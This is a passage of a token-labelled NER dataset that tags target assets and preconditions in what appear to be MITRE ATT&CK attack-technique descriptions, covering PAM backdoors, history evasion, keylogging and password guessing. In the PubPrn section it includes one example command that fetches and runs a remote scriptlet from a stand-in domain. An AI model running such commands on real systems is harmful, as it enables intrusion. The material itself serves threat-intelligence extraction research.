located O
in O
certain O
locations O
depending O
on O
their O
purpose O
such O
as O
<code>/Library/Preferences</code> O
(which O
execute O
with O
elevated O
privileges) O
and O
<code>~/Library/Preferences</code> O
(which O
execute O
with O
a O
user's O
privileges) O
. O 

Adversaries O
can O
modify O
these O
plist B-TARGET_ASSET
files I-TARGET_ASSET
to O
point O
to O
their O
own O
code O
, O
can O
use O
them O
to O
execute O
their O
code O
in O
the O
context O
of O
another O
user O
, O
bypass O
whitelisting O
procedures O
, O
or O
even O
use O
them O
as O
a O
persistence O
mechanism O
. O 

(Citation: O
Sofacy O
Komplex O
Trojan) O

Adversaries O
may O
modify O
pluggable B-TARGET_ASSET
authentication I-TARGET_ASSET
modules I-TARGET_ASSET
( I-TARGET_ASSET
PAM I-TARGET_ASSET
) I-TARGET_ASSET
to O
access O
user O
credentials B-TARGET_ASSET
or O
enable O
otherwise O
unwarranted O
access O
to O
accounts O
. O 

PAM B-TARGET_ASSET
is O
a O
modular O
system O
of O
configuration B-TARGET_ASSET
files I-TARGET_ASSET
, O
libraries B-TARGET_ASSET
, O
and O
executable B-TARGET_ASSET
files I-TARGET_ASSET
which O
guide O
authentication O
for O
many O
services B-TARGET_ASSET
. O 

The O
most O
common O
authentication B-TARGET_ASSET
module I-TARGET_ASSET
is O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
which O
retrieves O
, O
sets O
, O
and O
verifies O
account O
authentication O
information O
in O
<code>/etc/passwd</code> B-TARGET_ASSET
and O
<code>/etc/shadow</code> B-TARGET_ASSET
. O 

(Citation: O
Apple O
PAM)(Citation: O
Man O
Pam_Unix)(Citation: O
Red O
Hat O
PAM) O

Adversaries O
may O
modify O
components O
of O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
to O
create O
backdoors O
. O 

PAM B-TARGET_ASSET
components I-TARGET_ASSET
, O
such O
as O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
can O
be O
patched B-PRECON
to O
accept O
arbitrary O
adversary O
supplied O
values O
as O
legitimate O
credentials O
. O 

(Citation: O
PAM O
Backdoor) O

Malicious O
modifications O
to O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
may O
also O
be O
abused O
to O
steal O
credentials B-TARGET_ASSET
. O 

Adversaries O
may O
infect O
PAM B-TARGET_ASSET
resources I-TARGET_ASSET
with O
code O
to O
harvest O
user O
credentials B-TARGET_ASSET
, O
since O
the O
values O
exchanged O
with O
PAM B-TARGET_ASSET
components I-TARGET_ASSET
may O
be O
plain-text B-PRECON
since O
PAM B-TARGET_ASSET
does O
not O
store O
passwords O
. O 

(Citation: O
PAM O
Creds)(Citation: O
Apple O
PAM) O

An O
adversary O
may O
revert O
changes O
made O
to O
a O
cloud B-TARGET_ASSET
instance I-TARGET_ASSET
after O
they O
have O
performed O
malicious O
activities O
in O
attempt O
to O
evade O
detection O
and O
remove O
evidence O
of O
their O
presence O
. O 

In O
highly O
virtualized O
environments O
, O
such O
as O
cloud-based O
infrastructure B-TARGET_ASSET
, O
this O
may O
be O
accomplished O
by O
restoring O
virtual B-TARGET_ASSET
machine I-TARGET_ASSET
( I-TARGET_ASSET
VM I-TARGET_ASSET
) I-TARGET_ASSET
or O
data B-TARGET_ASSET
storage I-TARGET_ASSET
snapshots I-TARGET_ASSET
through O
the O
cloud B-TARGET_ASSET
management I-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
cloud B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 


Another O
variation O
of O
this O
technique O
is O
to O
utilize O
temporary B-TARGET_ASSET
storage I-TARGET_ASSET
attached B-PRECON
to O
the O
compute B-TARGET_ASSET
instance I-TARGET_ASSET
. O 

Most O
cloud O
providers O
provide O
various O
types O
of O
storage B-TARGET_ASSET
including O
persistent O
, O
local O
, O
and/or O
ephemeral B-PRECON
, O
with O
the O
ephemeral O
types O
often O
reset B-PRECON
upon I-PRECON
stop/restart I-PRECON
of I-PRECON
the I-PRECON
VM B-TARGET_ASSET
. O 

(Citation: O
Tech O
Republic O
- O
Restore O
AWS O
Snapshots)(Citation: O
Google O
- O
Restore O
Cloud O
Snapshot) O

The O
<code>HISTCONTROL</code> B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
keeps O
track O
of O
what O
should O
be O
saved O
by O
the O
<code>history</code> O
command O
and O
eventually O
into O
the O
<code>~/.bash_history</code> B-TARGET_ASSET
file I-TARGET_ASSET
when O
a O
user O
logs O
out O
. O 

This O
setting O
can O
be O
configured B-PRECON
to O
ignore O
commands O
that O
start O
with O
a O
space O
by O
simply O
setting O
it O
to O
""ignorespace"" O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
can O
also O
be O
set O
to O
ignore O
duplicate O
commands O
by O
setting O
it O
to O
""ignoredups"" O
. O 

In O
some O
Linux O
systems O
, O
this O
is O
set B-PRECON
by I-PRECON
default I-PRECON
to I-PRECON
""ignoreboth"" I-PRECON
which O
covers O
both O
of O
the O
previous O
examples O
. O 

This O
means O
that O
“ O
ls” O
will O
not O
be O
saved O
, O
but O
“ls” O
would O
be O
saved O
by O
history O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
does O
not O
exist B-PRECON
by I-PRECON
default I-PRECON
on O
macOS O
, O
but O
can O
be O
set O
by O
the O
user O
and O
will O
be O
respected O
. O 

Adversaries O
can O
use O
this O
to O
operate O
without O
leaving O
traces O
by O
simply O
prepending O
a O
space O
to O
all O
of O
their O
terminal O
commands O
. O 


Adversaries O
may O
gather O
information O
about O
the O
victim's O
hosts B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
hosts B-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
including O
administrative O
data O
(ex: O
name O
, O
assigned O
IP O
, O
functionality O
, O
etc.) O
as O
well O
as O
specifics O
regarding O
its O
configuration O
(ex: O
operating O
system O
, O
language O
, O
etc.) O
. O 


Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 

Adversaries O
may O
also O
compromise O
sites B-TARGET_ASSET
then O
include O
malicious O
content O
designed O
to O
collect O
host B-TARGET_ASSET
information I-TARGET_ASSET
from O
visitors O
. O 

(Citation: O
ATT O
ScanBox) O
Information O
about O
hosts B-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Social O
Media](https://attack.mitre.org/techniques/T1593/001) O
or O
[Search O
Victim-Owned O
Websites](https://attack.mitre.org/techniques/T1594)) O
. O 

Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593) O
or O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[Supply O
Chain O
Compromise](https://attack.mitre.org/techniques/T1195) O
or O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
also O
gather O
victim O
host B-TARGET_ASSET
information I-TARGET_ASSET
via O
User-Agent B-TARGET_ASSET
HTTP I-TARGET_ASSET
headers I-TARGET_ASSET
, O
which O
are O
sent O
to O
a O
server B-TARGET_ASSET
to O
identify O
the O
application B-TARGET_ASSET
, O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
vendor O
, O
and/or O
version O
of O
the O
requesting O
user O
agent O
. O 

This O
can O
be O
used O
to O
inform O
the O
adversary’s O
follow-on O
action O
. O 

For O
example O
, O
adversaries O
may O
check O
user O
agents O
for O
the O
requesting O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
then O
only O
serve O
malware B-TARGET_ASSET
for O
target O
operating B-TARGET_ASSET
systems I-TARGET_ASSET
while O
ignoring O
others O
. O 

(Citation: O
TrellixQakbot) O

Adversaries O
may O
search O
public O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
for O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 

Digital B-TARGET_ASSET
certificates I-TARGET_ASSET
are O
issued O
by O
a O
certificate O
authority O
(CA) O
in O
order O
to O
cryptographically O
verify O
the O
origin O
of O
signed O
content O
. O 

These O
certificates B-TARGET_ASSET
, O
such O
as O
those O
used O
for O
encrypted O
web O
traffic B-TARGET_ASSET
(HTTPS O
SSL/TLS O
communications O
) O
, O
contain O
information O
about O
the O
registered O
organization O
such O
as O
name O
and O
location O
. O 

Adversaries O
may O
search O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
to O
gather O
actionable O
information O
. O 

Threat O
actors O
can O
use O
online O
resources O
and O
lookup O
tools O
to O
harvest O
information O
about O
certificates B-TARGET_ASSET
. O 

(Citation: O
SSLShopper O
Lookup) O
Digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
may O
also O
be O
available B-PRECON
from O
artifacts B-TARGET_ASSET
signed B-PRECON
by I-PRECON
the I-PRECON
organization I-PRECON
(ex: O
certificates B-TARGET_ASSET
used O
from O
encrypted O
web O
traffic B-TARGET_ASSET
are O
served O
with O
content O
) O
. O 

(Citation: O
Medium O
SSL O
Cert) O
Information O
from O
these O
sources O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133) O
or O
[Trusted O
Relationship](https://attack.mitre.org/techniques/T1199)) O
. O 


Adversaries O
may O
log O
user O
keystrokes B-TARGET_ASSET
to O
intercept O
credentials B-TARGET_ASSET
as O
the O
user O
types O
them O
. O 

Keylogging O
is O
likely O
to O
be O
used O
to O
acquire O
credentials B-TARGET_ASSET
for O
new O
access O
opportunities O
when O
[OS B-TARGET_ASSET
Credential I-TARGET_ASSET
Dumping](https://attack.mitre.org/techniques/T1003) I-TARGET_ASSET
efforts O
are O
not O
effective O
, O
and O
may O
require O
an O
adversary O
to O
intercept O
keystrokes B-TARGET_ASSET
on O
a O
system B-TARGET_ASSET
for O
a O
substantial O
period O
of O
time O
before O
credentials B-TARGET_ASSET
can O
be O
successfully O
captured O
. O 

In O
order O
to O
increase O
the O
likelihood O
of O
capturing O
credentials B-TARGET_ASSET
quickly O
, O
an O
adversary O
may O
also O
perform O
actions O
such O
as O
clearing O
browser B-TARGET_ASSET
cookies I-TARGET_ASSET
to O
force O
users O
to O
reauthenticate O
to O
systems O
. O 

(Citation: O
Talos O
Kimsuky O
Nov O
2021) O

Keylogging O
is O
the O
most O
prevalent O
type O
of O
input O
capture O
, O
with O
many O
different O
ways O
of O
intercepting O
keystrokes B-TARGET_ASSET
. O 

(Citation: O
Adventures O
of O
a O
Keystroke) O
Some O
methods O
include O
: O

* O
Hooking O
API B-TARGET_ASSET
callbacks I-TARGET_ASSET
used O
for O
processing O
keystrokes B-TARGET_ASSET
. O 

Unlike O
[Credential B-TARGET_ASSET
API I-TARGET_ASSET
Hooking](https://attack.mitre.org/techniques/T1056/004) I-TARGET_ASSET
, O
this O
focuses O
solely O
on O
API B-TARGET_ASSET
functions I-TARGET_ASSET
intended O
for O
processing O
keystroke B-TARGET_ASSET
data I-TARGET_ASSET
. O 

* O
Reading O
raw O
keystroke B-TARGET_ASSET
data I-TARGET_ASSET
from O
the O
hardware B-TARGET_ASSET
buffer I-TARGET_ASSET
. O 

* O
Windows B-TARGET_ASSET
Registry I-TARGET_ASSET
modifications O
. O 

* O
Custom O
drivers B-TARGET_ASSET
. O 

* O
[Modify O
System O
Image](https://attack.mitre.org/techniques/T1601) O
may O
provide O
adversaries O
with O
hooks O
into O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
of O
network B-TARGET_ASSET
devices I-TARGET_ASSET
to O
read O
raw O
keystrokes B-TARGET_ASSET
for O
login O
sessions O
. O 

(Citation: O
Cisco O
Blog O
Legacy O
Device O
Attacks) O

Adversaries O
may O
attempt O
to O
hide O
their O
file-based O
artifacts O
by O
writing O
them O
to O
specific O
folders B-TARGET_ASSET
or O
file B-TARGET_ASSET
names I-TARGET_ASSET
excluded B-PRECON
from I-PRECON
antivirus I-PRECON
( I-PRECON
AV I-PRECON
) I-PRECON
scanning I-PRECON
and O
other O
defensive O
capabilities O
. O 

AV B-TARGET_ASSET
and O
other O
file-based O
scanners O
often O
include O
exclusions O
to O
optimize O
performance O
as O
well O
as O
ease O
installation O
and O
legitimate O
use O
of O
applications O
. O 

These O
exclusions O
may O
be O
contextual O
(e.g., O
scans O
are O
only O
initiated O
in O
response O
to O
specific O
triggering O
events/alerts) O
, O
but O
are O
also O
often O
hardcoded B-PRECON
strings I-PRECON
referencing O
specific O
folders B-TARGET_ASSET
and/or O
files B-TARGET_ASSET
assumed B-PRECON
to I-PRECON
be I-PRECON
trusted I-PRECON
and I-PRECON
legitimate I-PRECON
. O 

(Citation: O
Microsoft O
File O
Folder O
Exclusions) O

Adversaries O
may O
abuse O
these O
exclusions O
to O
hide O
their O
file-based O
artifacts O
. O 

For O
example O
, O
rather O
than O
tampering O
with O
tool O
settings O
to O
add O
a O
new O
exclusion O
(i.e., O
[Disable O
or O
Modify O
Tools](https://attack.mitre.org/techniques/T1562/001)) O
, O
adversaries O
may O
drop O
their O
file-based O
payloads O
in O
default B-PRECON
or O
otherwise O
well-known B-PRECON
exclusions I-PRECON
. O 

Adversaries O
may O
also O
use O
[Security O
Software O
Discovery](https://attack.mitre.org/techniques/T1518/001) O
and O
other O
[Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
activities O
to O
both O
discover O
and O
verify O
existing O
exclusions O
in O
a O
victim O
environment O
. O 


Adversaries O
may O
modify O
file B-TARGET_ASSET
or O
directory B-TARGET_ASSET
permissions/attributes I-TARGET_ASSET
to O
evade O
access O
control O
lists B-TARGET_ASSET
( I-TARGET_ASSET
ACLs I-TARGET_ASSET
) I-TARGET_ASSET
and O
access O
protected O
files B-TARGET_ASSET
. O 

(Citation: O
Hybrid O
Analysis O
Icacls1 O
June O
2018)(Citation: O
Hybrid O
Analysis O
Icacls2 O
May O
2018) O
File B-TARGET_ASSET
and O
directory B-TARGET_ASSET
permissions I-TARGET_ASSET
are O
commonly O
managed O
by O
ACLs B-TARGET_ASSET
configured B-PRECON
by I-PRECON
the I-PRECON
file I-PRECON
or I-PRECON
directory I-PRECON
owner I-PRECON
, O
or O
users O
with O
the O
appropriate O
permissions O
. O 

File B-TARGET_ASSET
and O
directory B-TARGET_ASSET
ACL I-TARGET_ASSET
implementations I-TARGET_ASSET
vary O
by O
platform O
, O
but O
generally O
explicitly O
designate O
which O
users O
or O
groups O
can O
perform O
which O
actions O
(read, O
write, O
execute, O
etc.) O
. O 


Most O
Linux O
and O
Linux-based O
platforms O
provide O
a O
standard O
set O
of O
permission O
groups O
(user, O
group, O
and O
other) O
and O
a O
standard O
set O
of O
permissions O
(read, O
write, O
and O
execute) O
that O
are O
applied O
to O
each O
group O
. O 

While O
nuances O
of O
each O
platform’s O
permissions O
implementation O
may O
vary O
, O
most O
of O
the O
platforms O
provide O
two O
primary O
commands O
used O
to O
manipulate O
file B-TARGET_ASSET
and O
directory B-TARGET_ASSET
ACLs I-TARGET_ASSET
: O
<code>chown</code> O
(short O
for O
change O
owner) O
, O
and O
<code>chmod</code> O
(short O
for O
change O
mode) O
. O 


Adversarial O
may O
use O
these O
commands O
to O
make O
themselves O
the O
owner O
of O
files B-TARGET_ASSET
and O
directories B-TARGET_ASSET
or O
change O
the O
mode O
if O
current O
permissions O
allow O
it O
. O 

They O
could O
subsequently O
lock O
others O
out O
of O
the O
file B-TARGET_ASSET
. O 

Specific O
file B-TARGET_ASSET
and O
directory B-TARGET_ASSET
modifications I-TARGET_ASSET
may O
be O
a O
required O
step O
for O
many O
techniques O
, O
such O
as O
establishing O
Persistence O
via O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
or O
tainting/hijacking O
other O
instrumental O
binary/configuration O
files B-TARGET_ASSET
via O
[Hijack O
Execution O
Flow](https://attack.mitre.org/techniques/T1574) O
. O 

(Citation: O
20 O
macOS O
Common O
Tools O
and O
Techniques) O

Adversaries O
with O
no B-PRECON
prior I-PRECON
knowledge I-PRECON
of I-PRECON
legitimate I-PRECON
credentials B-TARGET_ASSET
within O
the O
system O
or O
environment O
may O
guess O
passwords B-TARGET_ASSET
to O
attempt O
access O
to O
accounts B-TARGET_ASSET
. O 

Without O
knowledge O
of O
the O
password O
for O
an O
account B-TARGET_ASSET
, O
an O
adversary O
may O
opt O
to O
systematically O
guess O
the O
password B-TARGET_ASSET
using O
a O
repetitive O
or O
iterative O
mechanism O
. O 

An O
adversary O
may O
guess O
login O
credentials B-TARGET_ASSET
without O
prior O
knowledge O
of O
system O
or O
environment O
passwords O
during O
an O
operation O
by O
using O
a O
list O
of O
common O
passwords O
. O 

Password O
guessing O
may O
or O
may O
not O
take O
into O
account O
the O
target's O
policies O
on O
password O
complexity O
or O
use O
policies O
that O
may O
lock O
accounts B-TARGET_ASSET
out O
after O
a O
number O
of O
failed O
attempts O
. O 


Guessing O
passwords B-TARGET_ASSET
can O
be O
a O
risky O
option O
because O
it O
could O
cause O
numerous O
authentication O
failures O
and O
account B-TARGET_ASSET
lockouts I-TARGET_ASSET
, O
depending O
on O
the O
organization's O
login O
failure O
policies O
. O 

(Citation: O
Cylance O
Cleaver) O

Typically O
, O
management O
services B-TARGET_ASSET
over O
commonly O
used O
ports B-TARGET_ASSET
are O
used O
when O
guessing O
passwords B-TARGET_ASSET
. O 

Commonly O
targeted O
services B-TARGET_ASSET
include O
the O
following O
: O

* O
SSH B-TARGET_ASSET
(22/TCP) O
* O
Telnet B-TARGET_ASSET
(23/TCP) O
* O
FTP B-TARGET_ASSET
(21/TCP) O
* O
NetBIOS B-TARGET_ASSET
/ O
SMB B-TARGET_ASSET
/ O
Samba B-TARGET_ASSET
(139/TCP O
& O
445/TCP) O
* O
LDAP B-TARGET_ASSET
(389/TCP) O
* O
Kerberos B-TARGET_ASSET
(88/TCP) O
* O
RDP B-TARGET_ASSET
/ O
Terminal B-TARGET_ASSET
Services I-TARGET_ASSET
(3389/TCP) O
* O
HTTP/HTTP B-TARGET_ASSET
Management I-TARGET_ASSET
Services I-TARGET_ASSET
(80/TCP O
& O
443/TCP) O
* O
MSSQL B-TARGET_ASSET
(1433/TCP) O
* O
Oracle B-TARGET_ASSET
(1521/TCP) O
* O
MySQL B-TARGET_ASSET
(3306/TCP) O
* O
VNC B-TARGET_ASSET
(5900/TCP) O
* O
SNMP B-TARGET_ASSET
(161/UDP O
and O
162/TCP/UDP) O

In O
addition O
to O
management O
services B-TARGET_ASSET
, O
adversaries O
may O
""target O
single O
sign-on O
(SSO) O
and O
cloud-based O
applications B-TARGET_ASSET
utilizing O
federated O
authentication O
protocols B-TARGET_ASSET
,"" O
as O
well O
as O
externally O
facing O
email B-TARGET_ASSET
applications I-TARGET_ASSET
, O
such O
as O
Office O
365 O
. O 

(Citation: O
US-CERT O
TA18-068A O
2018) O
. O 

Further O
, O
adversaries O
may O
abuse O
network B-TARGET_ASSET
device I-TARGET_ASSET
interfaces I-TARGET_ASSET
(such O
as O
`wlanAPI`) O
to O
brute O
force O
accessible O
wifi-router(s) B-TARGET_ASSET
via O
wireless O
authentication O
protocols B-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Emotet O
2020) O

In O
default O
environments O
, O
LDAP B-TARGET_ASSET
and O
Kerberos B-TARGET_ASSET
connection O
attempts O
are O
less O
likely O
to O
trigger O
events O
over O
SMB B-TARGET_ASSET
, O
which O
creates O
Windows O
""logon O
failure"" O
event O
ID O
4625 O
. O 


Adversaries O
may O
use O
PubPrn B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
remote O
files B-TARGET_ASSET
. O 

PubPrn.vbs B-TARGET_ASSET
is O
a O
[Visual B-TARGET_ASSET
Basic](https://attack.mitre.org/techniques/T1059/005) I-TARGET_ASSET
script I-TARGET_ASSET
that O
publishes O
a O
printer B-TARGET_ASSET
to O
Active B-TARGET_ASSET
Directory I-TARGET_ASSET
Domain I-TARGET_ASSET
Services I-TARGET_ASSET
. O 

The O
script B-TARGET_ASSET
may O
be O
signed B-PRECON
by I-PRECON
Microsoft I-PRECON
and O
is O
commonly O
executed O
through O
the O
[Windows B-TARGET_ASSET
Command I-TARGET_ASSET
Shell](https://attack.mitre.org/techniques/T1059/003) I-TARGET_ASSET
via O
<code>Cscript.exe</code> B-TARGET_ASSET
. O 

For O
example O
, O
the O
following O
code O
publishes O
a O
printer B-TARGET_ASSET
within O
the O
specified O
domain O
: O
<code>cscript O
pubprn O
Printer1 O
LDAP://CN=Container1,DC=Domain1,DC=Com</code> O
. O 

(Citation: O
pubprn) O

Adversaries O
may O
abuse O
PubPrn B-TARGET_ASSET
to O
execute O
malicious O
payloads B-TARGET_ASSET
hosted B-PRECON
on I-PRECON
remote I-PRECON
sites I-PRECON
. O 

(Citation: O
Enigma0x3 O
PubPrn O
Bypass) O
To O
do O
so O
, O
adversaries O
may O
set O
the O
second O
<code>script:</code> O
parameter O
to O
reference O
a O
scriptlet B-TARGET_ASSET
file I-TARGET_ASSET
( I-TARGET_ASSET
.sct I-TARGET_ASSET
) I-TARGET_ASSET
hosted B-PRECON
on I-PRECON
a I-PRECON
remote I-PRECON
site I-PRECON
. O 

An O
example O
command O
is O
<code>pubprn.vbs O
127.0.0.1 O
script:https://mydomain.com/folder/file.sct</code> O
. O 

This O
behavior O
may O
bypass O
signature O
validation O
restrictions O
and O
application B-TARGET_ASSET
control I-TARGET_ASSET
solutions I-TARGET_ASSET
that O
do O
not O
account O
for O
abuse O
of O
this O
script B-TARGET_ASSET
. O 


In O
later O
versions O
of O
Windows O
(10+) O
, O
<code>PubPrn.vbs</code> B-TARGET_ASSET
has O
been O
updated B-PRECON
to O
prevent O
proxying O
execution O
from O
a O
remote O
site O
. O 

This O
is O
done O
by O
limiting O
the O
protocol O
specified O
in O
the O
second O
parameter O
to O
<code>LDAP://</code> O
, O
vice O
the O
<code>script:</code> O
moniker O
which O
could O
be O
used O
to O
reference O
remote O
code O
via O
HTTP(S) O
. O 


Adversaries O
may O
purchase O
technical O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
victims O
may O
be O
available B-PRECON
for O
purchase O
within O
reputable O
private O
sources O
and O
databases B-TARGET_ASSET
, O
such O
as O
paid O
subscriptions O
to O
feeds O
of O
scan O
databases B-TARGET_ASSET
or O
other O
data O
aggregation O
services B-TARGET_ASSET
. O 

Adversaries O
may O
also O
purchase O
information O
from O
less-reputable O
sources O
such O
as O
dark O
web O
or O
cybercrime O
blackmarkets O
. O 


Adversaries O
may O
purchase O
information O
about O
their O
already O
identified O
targets O
, O
or O
use O
purchased O
data O
to O
discover O
opportunities O
for O
successful O
breaches O
. O 

Threat O
actors O
may O
gather O
various O
technical O
details O
from O
purchased O
data O
, O
including O
but O
not O
limited O
to O
employee O
contact O
information O
, O
credentials B-TARGET_ASSET
, O
or O
specifics O
regarding O
a O
victim’s O
infrastructure B-TARGET_ASSET
. O 

(Citation: O
ZDNET O
Selling O
Data) O
Information O
from O
these O
sources O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
or O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133) O
or O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078)) O
. O 


Adversaries O
may O
abuse O
various O
implementations O
of O
JavaScript B-TARGET_ASSET
for O
execution O
. O 

JavaScript B-TARGET_ASSET
( I-TARGET_ASSET
JS I-TARGET_ASSET
) I-TARGET_ASSET
is O
a O
platform-independent O
scripting O
language O
(compiled O
just-in-time O
at O
runtime) O
commonly O
associated O
with O
scripts B-TARGET_ASSET
in O
webpages B-TARGET_ASSET
, O
though O
JS B-TARGET_ASSET
can O
be O
executed O
in O
runtime B-TARGET_ASSET
environments I-TARGET_ASSET
outside O
the O
browser B-TARGET_ASSET
. O 

(Citation: O
NodeJS) O

JScript B-TARGET_ASSET
is O
the O
Microsoft O
implementation O
of O
the O
same O
scripting O
standard O
. O 

JScript B-TARGET_ASSET
is O
interpreted O
via O
the O
Windows B-TARGET_ASSET
Script I-TARGET_ASSET
engine I-TARGET_ASSET
and O
thus O
integrated B-PRECON
with I-PRECON
many I-PRECON
components I-PRECON
of I-PRECON
Windows I-PRECON
such O
as O
the O
[Component B-TARGET_ASSET
Object I-TARGET_ASSET
Model](https://attack.mitre.org/techniques/T1559/001) I-TARGET_ASSET
and O
Internet B-TARGET_ASSET
Explorer I-TARGET_ASSET
HTML I-TARGET_ASSET
Application I-TARGET_ASSET
( I-TARGET_ASSET
HTA I-TARGET_ASSET
) I-TARGET_ASSET
pages I-TARGET_ASSET
. O 

(Citation: O
JScrip O
May O
2018)(Citation: O
Microsoft O
JScript O
2007)(Citation: O
Microsoft O
Windows O
Scripts) O

JavaScript B-TARGET_ASSET
for I-TARGET_ASSET
Automation I-TARGET_ASSET
( I-TARGET_ASSET
JXA I-TARGET_ASSET
) I-TARGET_ASSET
is O
a O
macOS O
scripting B-TARGET_ASSET
language I-TARGET_ASSET
based O
on O
JavaScript B-TARGET_ASSET
, O
included O
as O
part O
of O
Apple’s O
Open B-TARGET_ASSET
Scripting I-TARGET_ASSET
Architecture I-TARGET_ASSET
( I-TARGET_ASSET
OSA I-TARGET_ASSET
) I-TARGET_ASSET
, O
that O
was O
introduced O
in O
OSX O
10.10 O
. O 

Apple’s O
OSA B-TARGET_ASSET
provides O
scripting O
capabilities O
to O
control O
applications B-TARGET_ASSET
, O
interface O
with O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
and O
bridge O
access O
into O
the O
rest O
of O
Apple’s O
internal O
APIs B-TARGET_ASSET
. O 

As O
of O
OSX O
10.10 O
, O
OSA B-TARGET_ASSET
only O
supports O
two O
languages O
, O
JXA B-TARGET_ASSET
and O
[AppleScript](https://attack.mitre.org/techniques/T1059/002) B-TARGET_ASSET
. O 

Scripts B-TARGET_ASSET
can O
be O
executed O
via O
the O
command O
line O
utility B-TARGET_ASSET
<code>osascript</code> I-TARGET_ASSET
, O
they O
can O
be O
compiled O
into O
applications B-TARGET_ASSET
or O
script B-TARGET_ASSET
files I-TARGET_ASSET
via O
<code>osacompile</code> B-TARGET_ASSET
, O
and O
they O
can O
be O
compiled O
and O
executed O
in O
memory B-TARGET_ASSET
of O
other O
programs B-TARGET_ASSET
by O
leveraging O
the O
OSAKit B-TARGET_ASSET
Framework I-TARGET_ASSET
. O 

(Citation: O
Apple O
About O
Mac O
Scripting O
2016)(Citation: O
SpecterOps O
JXA O
2020)(Citation: O
SentinelOne O
macOS O
Red O
Team)(Citation: O
Red O
Canary O
Silver O
Sparrow O
Feb2021)(Citation: O
MDSec O
macOS O
JXA O
and O
VSCode) O

Adversaries O
may O
abuse O
various O
implementations O
of O
JavaScript B-TARGET_ASSET
to O
execute O
various O
behaviors O
. O 

Common O
uses O
include O
hosting O
malicious O
scripts B-TARGET_ASSET
on O
websites B-TARGET_ASSET
as O
part O
of O
a O
[Drive-by B-TARGET_ASSET
Compromise](https://attack.mitre.org/techniques/T1189) I-TARGET_ASSET
or O
downloading O
and O
executing O
these O
script B-TARGET_ASSET
files I-TARGET_ASSET
as O
secondary O
payloads B-TARGET_ASSET
. O 

Since O
these O
payloads B-TARGET_ASSET
are O
text-based B-PRECON
, O
it O
is O
also O
very O
common O
for O
adversaries O
to O
obfuscate O
their O
content O
as O
part O
of O
[Obfuscated O
Files O
or O
Information](https://attack.mitre.org/techniques/T1027) O
. O 


Adversaries O
may O
gather O
information O
about O
the O
victim's O
DNS B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

DNS B-TARGET_ASSET
information I-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
including O
registered O
name O
servers B-TARGET_ASSET
as O
well O
as O
records B-TARGET_ASSET
that O
outline O
addressing O
for O
a O
target’s O
subdomains B-TARGET_ASSET
, O
mail B-TARGET_ASSET
servers I-TARGET_ASSET
, O
and O
other O
hosts B-TARGET_ASSET
. O 

DNS B-TARGET_ASSET
MX I-TARGET_ASSET
, O
TXT I-TARGET_ASSET
, O
and O
SPF I-TARGET_ASSET
records I-TARGET_ASSET
may O
also O
reveal O
the O
use O
of O
third O
party O
cloud O
and O
SaaS O
providers O
, O
such O
as O
Office O
365 O
, O
G O
Suite O
, O
Salesforce O
, O
or O
Zendesk O
. O 

(Citation: O
Sean O
Metcalf O
Twitter O
DNS O
Records) O

Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
